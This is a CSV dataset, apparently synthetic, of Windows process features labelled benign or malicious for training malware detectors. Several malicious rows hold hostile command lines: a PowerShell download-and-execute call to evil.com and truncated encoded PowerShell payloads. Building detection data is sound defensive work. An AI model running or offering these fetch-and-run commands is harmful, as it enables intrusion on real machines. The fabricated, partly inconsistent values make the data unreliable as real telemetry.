process_name,pid,ppid,cmd_line,cmd_line_length,num_threads,num_handles,working_set_mb,private_bytes_mb,session_id,is_signed,num_loaded_dlls,has_network_conn,num_network_conns,writable_exec_sections,private_memory_ratio,heap_executable,vad_count,suspicious_parent,process_hollowing,dll_injection,reflective_load,encoded_powershell,lolbin_usage,wmi_execution,unusual_thread_start,yara_hits,memory_anomaly_score,label
lsass.exe,2317,1912,C:\Windows\System32\lsass.exe,30,22,172,53.56,59.66,1,1,64,0,0,0,0.283,0,99,0,0,0,0,0,0,0,0,0,0.0439,0
explorer.exe,7853,4714,C:\Windows\System32\explorer.exe,74,5,117,68.07,52.81,1,0,11,1,4,1,0.728,1,84,1,1,0,0,0,0,0,1,5,0.7924,1
SearchIndexer.exe,8466,5057,C:\Windows\System32\SearchIndexer.exe,38,8,343,134.9,43.76,1,1,22,0,0,0,0.267,0,110,0,0,0,0,0,0,0,0,0,0.1405,0
services.exe,2607,1238,C:\Windows\System32\services.exe,116,27,338,40.46,82.71,0,1,21,0,0,0,0.08,0,119,0,0,0,0,0,0,0,0,0,0.015,0
taskmgr.exe,5147,4298,C:\Windows\System32\taskmgr.exe,70,23,66,23.79,67.01,0,1,54,0,0,0,0.22,0,67,0,0,0,0,0,0,0,0,0,0.1147,0
services.exe,7910,5254,C:\Windows\System32\services.exe,88,25,162,28.81,48.05,0,1,17,0,0,0,0.12,0,61,0,0,0,0,0,0,0,0,0,0.0551,0
calc.exe,5012,8397,C:\Windows\System32\calc.exe,74,33,303,69.17,64.42,1,1,62,0,0,0,0.218,0,42,0,0,0,0,0,0,0,0,0,0.0381,0
SearchIndexer.exe,9510,3057,C:\Windows\System32\SearchIndexer.exe,98,25,431,151.45,58.58,1,1,73,0,0,0,0.055,0,28,0,0,0,0,0,0,0,0,0,0.1173,0
SearchIndexer.exe,7671,5503,C:\Windows\System32\SearchIndexer.exe,118,18,386,120.95,66.83,0,1,60,0,0,0,0.275,0,101,0,0,0,0,0,0,0,0,0,0.0524,0
spoolsv.exe,2051,4688,C:\Windows\System32\spoolsv.exe,82,20,410,123.94,86.48,1,1,76,0,0,0,0.154,0,31,0,0,0,0,0,0,0,0,0,0.0339,0
taskmgr.exe,9573,680,C:\Windows\System32\taskmgr.exe,111,6,433,125.88,3.66,1,1,66,0,0,0,0.076,0,71,0,0,0,0,0,0,0,0,0,0.0861,0
csrss.exe,2208,5246,C:\Windows\System32\csrss.exe,86,22,213,18.44,99.55,1,1,69,0,0,0,0.189,0,119,0,0,0,0,0,0,0,0,0,0.1299,0
conhost.exe,1506,3357,C:\Windows\System32\conhost.exe,100,18,477,105.39,2.75,1,1,24,0,0,0,0.237,0,20,0,0,0,0,0,0,0,0,0,0.0876,0
taskmgr.exe,6308,1139,C:\Windows\System32\taskmgr.exe,66,22,411,26.12,12.88,1,1,36,0,0,0,0.311,0,60,0,0,0,0,0,0,0,0,0,0.0161,0
lsass.exe,2168,8228,C:\Windows\System32\lsass.exe,77,22,219,96.01,60.23,1,1,29,0,0,0,0.173,0,33,0,0,0,0,0,0,0,0,0,0.0267,0
powershell.exe,7083,3919,powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAY...7=BP7/WeKhgHCPqeWbmnFb2K16w5dEX5YWTZZU3aHtSt=9IWHvR+9A8N,124,7,196,26.03,15.72,1,1,54,1,4,1,0.503,1,127,1,0,0,0,1,1,0,0,2,0.7768,1
MsMpEng.exe,1247,4674,"""C:\Program Files\Windows Defender\MsMpEng.exe""",109,16,392,194.37,88.42,1,1,12,0,0,0,0.294,0,68,0,0,0,0,0,0,0,0,0,0.0105,0
taskmgr.exe,1428,8460,C:\Windows\System32\taskmgr.exe,93,28,378,169.95,47.51,1,1,43,0,0,0,0.144,0,112,0,0,0,0,0,0,0,0,0,0.11,0
conhost.exe,6086,2538,C:\Windows\System32\conhost.exe,119,11,422,128.26,73.64,0,1,58,0,0,0,0.308,0,49,0,0,0,0,0,0,0,0,0,0.0001,0
explorer.exe,6470,1814,C:\Windows\Explorer.EXE,65,18,232,103.98,68.26,1,1,69,0,0,0,0.332,0,70,0,0,0,0,0,0,0,0,0,0.0642,0
RuntimeBroker.exe,8115,5827,C:\Windows\System32\RuntimeBroker.exe,72,15,325,157.6,43.58,0,1,45,0,0,0,0.124,0,63,0,0,0,0,0,0,0,0,0,0.0314,0
conhost.exe,9707,2309,C:\Windows\System32\conhost.exe,113,24,252,154.55,37.1,0,1,52,0,0,0,0.204,0,73,0,0,0,0,0,0,0,0,0,0.0261,0
System,4,756,C:\Windows\System32\System,41,5,487,172.96,30.71,0,1,55,0,0,0,0.19,0,100,0,0,0,0,0,0,0,0,0,0.043,0
RuntimeBroker.exe,1071,6474,C:\Windows\System32\RuntimeBroker.exe,48,14,177,68.26,60.68,1,1,48,0,0,0,0.127,0,118,0,0,0,0,0,0,0,0,0,0.124,0
cscript.exe,6068,8615,cscript.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),128,5,101,55.88,47.02,1,1,24,1,3,2,0.416,0,48,1,0,0,0,0,1,0,0,1,0.5195,1
RuntimeBroker.exe,8285,421,C:\Windows\System32\RuntimeBroker.exe,77,22,418,187.98,17.71,1,1,39,0,0,0,0.081,0,34,0,0,0,0,0,0,0,0,0,0.0098,0
powershell.exe,1987,7617,powershell.exe -e JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtA...=i4xVM54Vx9T7zJkR4=gltcv9RZrxmfAeAyXhOt888HJkSveu7i50x0XFma8aJXSh7Gl09CqT5t76CWB4szVfwzC7Zp6HzT/MMXKntSMz7xDgiEVH9O1fL=UVmQNB=A15Clqb92K/,220,9,69,25.83,56.45,1,1,25,1,4,0,0.774,0,64,0,0,0,0,1,1,0,0,4,0.7179,1
csrss.exe,9820,3707,C:\Windows\System32\csrss.exe,101,6,498,9.79,40.43,0,1,29,0,0,0,0.335,0,28,0,0,0,0,0,0,0,0,0,0.1209,0
winlogon.exe,3958,8864,C:\Windows\System32\winlogon.exe,51,7,187,177.75,41.37,0,1,33,0,0,0,0.324,0,77,0,0,0,0,0,0,0,0,0,0.145,0
msiexec.exe,6518,5335,msiexec.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),138,4,65,79.02,28.68,1,1,22,1,3,0,0.628,0,66,1,0,0,0,1,1,0,0,1,0.8374,1
explorer.exe,6892,4482,C:\Windows\Explorer.EXE,110,17,476,177.08,59.24,1,1,11,0,0,0,0.098,0,97,0,0,0,0,0,0,0,0,0,0.0162,0
notepad.exe,2267,5894,C:\Windows\System32\notepad.exe,78,5,288,70.23,56.76,0,1,67,0,0,0,0.333,0,55,0,0,0,0,0,0,0,0,0,0.0382,0
RuntimeBroker.exe,9778,8692,C:\Windows\System32\RuntimeBroker.exe,78,25,104,194.78,40.37,0,1,73,0,0,0,0.067,0,36,0,0,0,0,0,0,0,0,0,0.0954,0
firefox.exe,8801,1605,C:\Windows\System32\firefox.exe,87,5,128,34.95,92.55,1,1,79,1,9,0,0.227,0,54,0,0,0,0,0,0,0,0,0,0.0034,0
explorer.exe,783,2228,C:\Windows\System32\explorer.exe,56,5,114,189.64,141.88,1,0,76,0,0,7,0.812,1,170,0,0,1,0,0,0,0,0,2,0.8043,1
MsMpEng.exe,8114,5172,"""C:\Program Files\Windows Defender\MsMpEng.exe""",55,17,110,8.14,53.69,0,1,32,0,0,0,0.338,0,119,0,0,0,0,0,0,0,0,0,0.0061,0
notepad.exe,6738,4526,C:\Windows\System32\notepad.exe,78,33,208,126.42,57.92,0,1,5,0,0,0,0.3,0,59,0,0,0,0,0,0,0,0,0,0.1048,0
System,4,9131,C:\Windows\System32\System,35,39,65,56.97,66.18,1,1,15,0,0,0,0.083,0,60,0,0,0,0,0,0,0,0,0,0.0116,0
cscript.exe,3446,8973,cscript.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),170,5,111,61.81,42.08,1,1,19,1,3,2,0.644,0,76,1,0,0,0,1,1,0,0,1,0.8293,1
wininit.exe,2182,5834,C:\Windows\System32\wininit.exe,108,22,183,160.58,88.0,0,1,27,0,0,0,0.341,0,67,0,0,0,0,0,0,0,0,0,0.083,0
csrss.exe,5656,8406,C:\Windows\System32\csrss.exe,69,30,86,36.74,45.11,1,1,16,0,0,0,0.31,0,99,0,0,0,0,0,0,0,0,0,0.0356,0
lsass.exe,7425,7720,C:\Windows\System32\lsass.exe,117,23,243,113.62,67.07,0,1,37,0,0,0,0.184,0,27,0,0,0,0,0,0,0,0,0,0.0091,0
explorer.exe,4558,2945,C:\Windows\Explorer.EXE,58,10,353,11.8,86.68,0,1,6,0,0,0,0.209,0,65,0,0,0,0,0,0,0,0,0,0.0859,0
spoolsv.exe,1081,9558,C:\Windows\System32\spoolsv.exe,21,27,461,159.66,96.99,1,1,12,0,0,0,0.228,0,31,0,0,0,0,0,0,0,0,0,0.0814,0
bitsadmin.exe,9315,5640,bitsadmin.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),241,2,77,76.05,41.54,1,1,23,1,3,1,0.663,1,33,1,0,0,0,1,1,0,0,4,0.8804,1
notepad.exe,5161,9261,C:\Windows\System32\notepad.exe,49,17,217,234.46,185.92,1,0,64,1,3,7,0.613,1,81,0,0,1,0,0,0,0,0,3,0.8024,1
notepad.exe,1974,2362,C:\Windows\System32\notepad.exe,50,7,373,58.55,140.43,1,0,123,0,1,3,0.74,1,194,0,0,1,0,0,0,0,0,2,0.6261,1
RuntimeBroker.exe,8505,6271,C:\Windows\System32\RuntimeBroker.exe,54,16,488,84.06,80.83,1,1,44,0,0,0,0.117,0,100,0,0,0,0,0,0,0,0,0,0.0327,0
smss.exe,5400,4,C:\Windows\System32\smss.exe,44,14,372,179.75,56.52,0,1,58,0,0,0,0.14,0,111,0,0,0,0,0,0,0,0,0,0.0172,0
notepad.exe,7863,6152,C:\Windows\System32\notepad.exe,36,18,320,70.09,78.83,1,0,90,1,2,7,0.781,1,139,0,0,1,0,0,0,0,0,2,0.7527,1
wmiprvse.exe,8394,2311,wmiprvse.exe -secured -Embedding,92,7,213,22.56,76.42,1,1,26,0,1,3,0.675,1,161,1,0,0,0,0,0,1,0,3,0.8273,1
notepad.exe,2085,6938,C:\Windows\System32\notepad.exe,63,2,111,87.7,89.22,1,1,7,0,0,0,0.187,0,78,0,0,0,0,0,0,0,0,0,0.1332,0
firefox.exe,9444,9260,C:\Windows\System32\firefox.exe,94,17,98,196.92,56.72,1,1,51,0,19,0,0.341,0,30,0,0,0,0,0,0,0,0,0,0.1019,0
firefox.exe,7897,2068,C:\Windows\System32\firefox.exe,45,31,234,63.98,91.66,0,1,30,1,5,0,0.323,0,58,0,0,0,0,0,0,0,0,0,0.1023,0
notepad.exe,9089,9685,C:\Windows\System32\notepad.exe,35,6,253,208.23,109.35,1,0,64,1,5,4,0.863,1,199,0,0,1,0,0,0,0,0,2,0.9072,1
RuntimeBroker.exe,8513,9784,C:\Windows\System32\RuntimeBroker.exe,77,28,51,99.89,94.95,1,1,47,0,0,0,0.162,0,28,0,0,0,0,0,0,0,0,0,0.1372,0
wscript.exe,7782,7237,wscript.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),234,5,20,31.84,46.98,1,1,30,1,4,1,0.588,1,71,1,0,0,0,0,1,0,0,1,0.7746,1
powershell.exe,2818,9028,powershell.exe -e JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtA...,189,5,107,67.56,21.57,1,1,23,1,3,0,0.791,0,58,1,0,0,0,1,1,0,0,2,0.755,1
explorer.exe,3484,7601,C:\Windows\Explorer.EXE,20,26,297,120.09,60.19,0,1,46,0,0,0,0.137,0,25,0,0,0,0,0,0,0,0,0,0.0933,0
explorer.exe,7907,3336,C:\Windows\Explorer.EXE,74,23,497,163.05,48.9,0,1,56,0,0,0,0.193,0,39,0,0,0,0,0,0,0,0,0,0.0201,0
conhost.exe,4562,2221,C:\Windows\System32\conhost.exe,52,22,356,194.94,41.98,0,1,45,0,0,0,0.196,0,54,0,0,0,0,0,0,0,0,0,0.0355,0
System,4,2709,C:\Windows\System32\System,60,6,307,11.3,48.03,1,1,12,0,0,0,0.25,0,108,0,0,0,0,0,0,0,0,0,0.1028,0
firefox.exe,4912,7504,C:\Windows\System32\firefox.exe,56,17,340,16.38,14.65,1,1,72,0,17,0,0.336,0,43,0,0,0,0,0,0,0,0,0,0.1176,0
svchost.exe,7754,5109,C:\Windows\System32\svchost.exe,34,10,300,201.43,169.61,1,0,137,1,5,4,0.661,1,155,0,0,1,1,0,0,0,0,2,0.8327,1
notepad.exe,1398,7991,C:\Windows\System32\notepad.exe,117,30,140,189.05,94.74,1,1,54,0,0,0,0.307,0,38,0,0,0,0,0,0,0,0,0,0.1416,0
System,4,5982,C:\Windows\System32\System,38,32,55,102.94,26.23,0,1,10,0,0,0,0.086,0,86,0,0,0,0,0,0,0,0,0,0.1406,0
powershell.exe,7510,4444,powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAY...dfGi=L6aZozgF7OF0gdg+IbAE4=3GVt903RfpqP/Jg0sMbjEjY09Je3YbAQ7ynH=dtv+P8F3N7QDYAh37bWo9wHUUR,158,8,141,15.97,77.84,1,1,56,1,2,1,0.605,1,122,0,0,0,0,1,1,0,0,3,0.7966,1
services.exe,8910,3623,C:\Windows\System32\services.exe,34,1,417,143.78,91.5,0,1,40,0,0,0,0.189,0,91,0,0,0,0,0,0,0,0,0,0.1462,0
mshta.exe,2103,8389,mshta.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),297,2,136,74.74,16.73,1,1,16,1,2,1,0.494,0,110,1,0,0,0,1,1,0,0,1,0.5193,1
explorer.exe,6447,7361,C:\Windows\System32\explorer.exe,37,2,100,135.13,72.89,1,0,7,1,6,3,0.77,1,177,1,1,0,0,0,0,0,1,3,0.8615,1
chrome.exe,791,678,chrome.exe --type=renderer --disable-gpu,44,29,438,15.88,11.46,1,1,10,1,10,0,0.071,0,84,0,0,0,0,0,0,0,0,0,0.1252,0
OneDrive.exe,6660,7376,C:\Windows\System32\OneDrive.exe,57,39,316,157.03,63.82,0,1,70,1,0,0,0.094,0,44,0,0,0,0,0,0,0,0,0,0.0452,0
msiexec.exe,7422,8262,msiexec.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),211,2,101,70.19,11.29,1,1,32,1,3,2,0.627,1,67,1,0,0,0,1,1,0,0,4,0.8818,1
spoolsv.exe,7068,8789,C:\Windows\System32\spoolsv.exe,54,35,472,105.04,53.86,1,1,77,0,0,0,0.2,0,21,0,0,0,0,0,0,0,0,0,0.0936,0
wininit.exe,9864,1332,C:\Windows\System32\wininit.exe,106,35,435,85.66,95.92,0,1,52,0,0,0,0.264,0,114,0,0,0,0,0,0,0,0,0,0.0103,0
WmiPrvSE.exe,4584,8793,wmiprvse.exe -secured -Embedding,63,11,290,28.39,67.36,1,1,26,1,3,3,0.667,1,118,0,0,0,0,0,0,1,0,2,0.762,1
SearchIndexer.exe,1600,7072,C:\Windows\System32\SearchIndexer.exe,48,39,340,53.2,9.71,0,1,60,0,0,0,0.234,0,75,0,0,0,0,0,0,0,0,0,0.1089,0
certutil.exe,8926,5378,certutil.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),193,2,50,41.59,15.78,1,1,22,1,4,0,0.52,0,39,1,0,0,0,1,1,0,0,1,0.8721,1
smss.exe,8175,4,C:\Windows\System32\smss.exe,68,10,171,32.09,42.49,1,1,30,0,0,0,0.28,0,91,0,0,0,0,0,0,0,0,0,0.0142,0
OneDrive.exe,1390,7840,C:\Windows\System32\OneDrive.exe,100,23,296,171.47,75.97,0,1,41,1,0,0,0.18,0,50,0,0,0,0,0,0,0,0,0,0.0876,0
svchost.exe,6940,5276,C:\Windows\System32\svchost.exe,46,17,243,118.88,197.42,1,0,110,1,5,6,0.861,1,148,0,0,1,1,0,0,0,0,1,0.9259,1
taskmgr.exe,4954,5485,C:\Windows\System32\taskmgr.exe,44,10,151,131.55,33.09,1,1,51,0,0,0,0.317,0,111,0,0,0,0,0,0,0,0,0,0.1042,0
firefox.exe,2316,8312,C:\Windows\System32\firefox.exe,73,34,258,12.13,36.76,0,1,14,1,4,0,0.07,0,54,0,0,0,0,0,0,0,0,0,0.0477,0
spoolsv.exe,745,6484,C:\Windows\System32\spoolsv.exe,106,5,245,136.33,11.49,0,1,64,0,0,0,0.333,0,79,0,0,0,0,0,0,0,0,0,0.0229,0
SearchIndexer.exe,3746,2671,C:\Windows\System32\SearchIndexer.exe,104,7,81,153.31,52.33,1,1,50,0,0,0,0.083,0,106,0,0,0,0,0,0,0,0,0,0.0571,0
csrss.exe,537,6163,C:\Windows\System32\csrss.exe,86,27,390,199.54,16.46,0,1,20,0,0,0,0.212,0,53,0,0,0,0,0,0,0,0,0,0.0857,0
services.exe,3495,6973,C:\Windows\System32\services.exe,96,16,387,195.11,46.37,0,1,53,0,0,0,0.326,0,98,0,0,0,0,0,0,0,0,0,0.133,0
firefox.exe,5215,5867,C:\Windows\System32\firefox.exe,60,11,106,19.25,66.92,0,1,54,1,13,0,0.056,0,108,0,0,0,0,0,0,0,0,0,0.0297,0
taskmgr.exe,1620,7287,C:\Windows\System32\taskmgr.exe,104,38,182,6.4,82.16,1,1,70,0,0,0,0.286,0,39,0,0,0,0,0,0,0,0,0,0.1058,0
conhost.exe,8560,9924,C:\Windows\System32\conhost.exe,83,39,378,85.57,37.31,1,1,14,0,0,0,0.086,0,61,0,0,0,0,0,0,0,0,0,0.1192,0
services.exe,2681,4303,C:\Windows\System32\services.exe,22,16,154,158.92,45.2,0,1,26,0,0,0,0.293,0,30,0,0,0,0,0,0,0,0,0,0.0261,0
System,4,5426,C:\Windows\System32\System,27,25,51,176.94,71.1,0,1,35,0,0,0,0.078,0,37,0,0,0,0,0,0,0,0,0,0.0275,0
System,4,6328,C:\Windows\System32\System,99,17,119,50.02,84.29,1,1,29,0,0,0,0.256,0,84,0,0,0,0,0,0,0,0,0,0.0117,0
svchost.exe,9420,7393,C:\Windows\system32\svchost.exe -k netsvcs,117,17,375,115.21,69.84,1,1,53,0,0,0,0.262,0,21,0,0,0,0,0,0,0,0,0,0.0845,0
MsMpEng.exe,4286,6316,"""C:\Program Files\Windows Defender\MsMpEng.exe""",22,34,482,101.13,99.09,0,1,35,0,0,0,0.217,0,21,0,0,0,0,0,0,0,0,0,0.0768,0
MsMpEng.exe,2510,454,"""C:\Program Files\Windows Defender\MsMpEng.exe""",104,17,144,90.8,4.79,0,1,25,0,0,0,0.329,0,20,0,0,0,0,0,0,0,0,0,0.1034,0
powershell.exe,7256,4578,powershell.exe -e JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtA...Ry0XS=1TSBEjDrSG8a5LQe+TVRfgJrqRbWMqhT7e8Ibj/sVqd2oIJJ6IC=85T2s/rfChlrzADGK69tPgb/LAl1pKrI44Dzy+G=L4e6as7O9Nq3iFjm=eyxjBOTNb4jXopDYxXHmB9klgrK,225,4,104,44.19,53.53,1,1,52,1,2,2,0.518,1,127,0,0,0,0,1,1,0,0,2,0.6639,1
conhost.exe,3555,1238,C:\Windows\System32\conhost.exe,23,22,236,33.39,41.04,1,1,41,0,0,0,0.101,0,111,0,0,0,0,0,0,0,0,0,0.0092,0
powershell.exe,8943,2465,powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAY...S0m8GgkL2QwfWEfhGtglWw2NDp7w1VQiz9/mARJa=MLXJhGLgwhs18+m7tf,127,3,187,34.99,61.59,1,1,52,1,5,2,0.582,0,122,0,0,0,0,1,1,0,0,2,0.7271,1
notepad.exe,4747,7150,C:\Windows\System32\notepad.exe,43,9,209,76.47,19.08,1,1,47,0,0,0,0.121,0,33,0,0,0,0,0,0,0,0,0,0.0045,0
spoolsv.exe,4704,2558,C:\Windows\System32\spoolsv.exe,116,27,390,69.65,16.45,0,1,54,0,0,0,0.2,0,33,0,0,0,0,0,0,0,0,0,0.1241,0
System,4,9061,C:\Windows\System32\System,39,39,487,38.71,12.83,0,1,34,0,0,0,0.229,0,75,0,0,0,0,0,0,0,0,0,0.1188,0
System,4,9213,C:\Windows\System32\System,114,3,421,143.7,16.13,0,1,77,0,0,0,0.257,0,54,0,0,0,0,0,0,0,0,0,0.1163,0
RuntimeBroker.exe,9177,5402,C:\Windows\System32\RuntimeBroker.exe,68,25,340,73.4,72.57,0,1,78,0,0,0,0.106,0,83,0,0,0,0,0,0,0,0,0,0.1288,0
lsass.exe,521,6493,C:\Windows\System32\lsass.exe,80,1,121,182.95,55.89,0,1,5,0,0,0,0.055,0,105,0,0,0,0,0,0,0,0,0,0.0243,0
SearchIndexer.exe,7913,9639,C:\Windows\System32\SearchIndexer.exe,115,38,242,70.75,35.95,0,1,51,0,0,0,0.333,0,57,0,0,0,0,0,0,0,0,0,0.0094,0
explorer.exe,6527,1196,C:\Windows\Explorer.EXE,24,30,331,80.94,72.39,1,1,34,0,0,0,0.29,0,111,0,0,0,0,0,0,0,0,0,0.0586,0
svchost.exe,1392,3621,C:\Windows\System32\svchost.exe,34,13,265,117.4,151.27,1,0,74,0,2,2,0.738,1,210,0,0,1,0,0,0,0,0,3,0.5562,1
System,4,1279,C:\Windows\System32\System,114,23,188,34.94,1.73,0,1,10,0,0,0,0.069,0,47,0,0,0,0,0,0,0,0,0,0.0565,0
taskmgr.exe,8095,748,C:\Windows\System32\taskmgr.exe,110,3,137,69.61,59.24,0,1,42,0,0,0,0.095,0,61,0,0,0,0,0,0,0,0,0,0.0815,0
wininit.exe,8658,7892,C:\Windows\System32\wininit.exe,23,14,221,120.14,25.14,0,1,16,0,0,0,0.21,0,54,0,0,0,0,0,0,0,0,0,0.0293,0
System,4,3427,C:\Windows\System32\System,30,13,479,103.03,43.58,0,1,7,0,0,0,0.338,0,93,0,0,0,0,0,0,0,0,0,0.0062,0
chrome.exe,8455,5671,chrome.exe --type=renderer --disable-gpu,96,28,173,156.51,25.31,1,1,66,0,4,0,0.158,0,90,0,0,0,0,0,0,0,0,0,0.0449,0
certutil.exe,3866,2358,certutil.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),292,5,80,75.33,59.89,1,1,10,1,4,1,0.69,0,87,1,0,0,0,0,1,0,0,1,0.4712,1
System,4,5423,C:\Windows\System32\System,99,30,83,136.47,50.19,0,1,20,0,0,0,0.313,0,31,0,0,0,0,0,0,0,0,0,0.0427,0
explorer.exe,4572,800,C:\Windows\Explorer.EXE,78,37,384,178.57,25.04,0,1,74,0,0,0,0.205,0,86,0,0,0,0,0,0,0,0,0,0.1269,0
explorer.exe,945,6770,C:\Windows\Explorer.EXE,119,15,372,67.67,63.92,0,1,26,0,0,0,0.179,0,116,0,0,0,0,0,0,0,0,0,0.146,0
OneDrive.exe,774,820,C:\Windows\System32\OneDrive.exe,35,5,212,107.34,0.69,1,1,68,1,0,0,0.092,0,56,0,0,0,0,0,0,0,0,0,0.0657,0
powershell.exe,9093,8271,powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA...SYPlsGkFTqQVU+FzF2P3XEoFOYOJyNnumZuiD6qkbEbMyv/bmWGrP+/92wYVc,149,3,92,60.44,24.28,1,1,52,1,2,1,0.547,0,111,1,0,0,0,1,1,0,0,3,0.7542,1
calc.exe,5755,6909,C:\Windows\System32\calc.exe,45,3,89,108.54,46.1,1,0,13,1,7,3,0.763,1,132,1,1,0,0,0,0,0,1,5,0.8149,1
cmd.exe,4484,6338,cmd.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),250,3,48,17.89,16.51,1,1,33,1,4,1,0.495,0,111,1,0,0,0,1,1,0,0,3,0.6375,1
wmiprvse.exe,921,7054,wmiprvse.exe -secured -Embedding,96,7,257,90.76,23.56,1,1,29,0,3,3,0.674,0,149,1,0,0,0,0,0,1,0,2,0.6269,1
calc.exe,9515,5722,C:\Windows\System32\calc.exe,22,10,393,57.68,78.86,1,1,52,0,0,0,0.329,0,118,0,0,0,0,0,0,0,0,0,0.0064,0
taskmgr.exe,7137,5447,C:\Windows\System32\taskmgr.exe,94,3,250,67.77,46.24,1,1,38,0,0,0,0.093,0,31,0,0,0,0,0,0,0,0,0,0.0023,0
wininit.exe,8509,2123,C:\Windows\System32\wininit.exe,44,38,296,32.91,61.24,1,1,64,0,0,0,0.297,0,34,0,0,0,0,0,0,0,0,0,0.0823,0
winlogon.exe,2194,2302,C:\Windows\System32\winlogon.exe,24,15,296,36.89,75.77,0,1,30,0,0,0,0.283,0,35,0,0,0,0,0,0,0,0,0,0.1197,0
svchost.exe,8559,3783,C:\Windows\System32\svchost.exe,53,16,348,64.68,140.06,1,0,50,0,5,5,0.608,1,205,0,0,1,1,0,0,0,0,3,0.5566,1
smss.exe,8588,4,C:\Windows\System32\smss.exe,55,13,285,158.7,77.69,1,1,59,0,0,0,0.165,0,109,0,0,0,0,0,0,0,0,0,0.06,0
MsMpEng.exe,1682,6655,"""C:\Program Files\Windows Defender\MsMpEng.exe""",52,35,396,100.56,76.9,0,1,25,0,0,0,0.227,0,55,0,0,0,0,0,0,0,0,0,0.0477,0
chrome.exe,9418,2717,chrome.exe --type=renderer --disable-gpu,46,35,63,123.92,67.99,0,1,61,0,10,0,0.231,0,52,0,0,0,0,0,0,0,0,0,0.0062,0
winlogon.exe,1351,3857,C:\Windows\System32\winlogon.exe,29,25,317,49.73,74.69,0,1,11,0,0,0,0.282,0,85,0,0,0,0,0,0,0,0,0,0.0166,0
chrome.exe,1690,4301,chrome.exe --type=renderer --disable-gpu,29,7,303,151.25,4.2,1,1,52,1,18,0,0.141,0,77,0,0,0,0,0,0,0,0,0,0.1315,0
notepad.exe,1329,1291,C:\Windows\System32\notepad.exe,57,5,187,136.48,62.4,1,0,4,1,8,2,0.876,1,141,1,1,0,0,0,0,0,1,4,0.8218,1
calc.exe,6216,4348,C:\Windows\System32\calc.exe,31,19,158,114.27,59.22,1,1,68,0,0,0,0.051,0,48,0,0,0,0,0,0,0,0,0,0.0929,0
firefox.exe,9408,1626,C:\Windows\System32\firefox.exe,44,8,129,94.03,39.51,1,1,23,1,15,0,0.144,0,38,0,0,0,0,0,0,0,0,0,0.0196,0
notepad.exe,4640,7405,C:\Windows\System32\notepad.exe,67,28,160,9.47,22.75,1,1,39,0,0,0,0.174,0,28,0,0,0,0,0,0,0,0,0,0.1237,0
mspaint.exe,9841,7380,C:\Windows\System32\mspaint.exe,71,6,180,82.46,118.71,1,0,11,1,1,4,0.779,1,55,1,1,0,0,0,0,0,1,2,0.7263,1
svchost.exe,9308,8684,C:\Windows\system32\svchost.exe -k netsvcs,67,6,337,104.49,13.34,1,1,70,0,0,0,0.158,0,82,0,0,0,0,0,0,0,0,0,0.0309,0
cscript.exe,9717,812,cscript.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),293,1,119,57.17,17.26,1,1,12,1,3,1,0.729,0,107,1,0,0,0,0,1,0,0,3,0.6853,1
csrss.exe,7419,2372,C:\Windows\System32\csrss.exe,106,28,387,28.23,68.61,0,1,41,0,0,0,0.055,0,95,0,0,0,0,0,0,0,0,0,0.1433,0
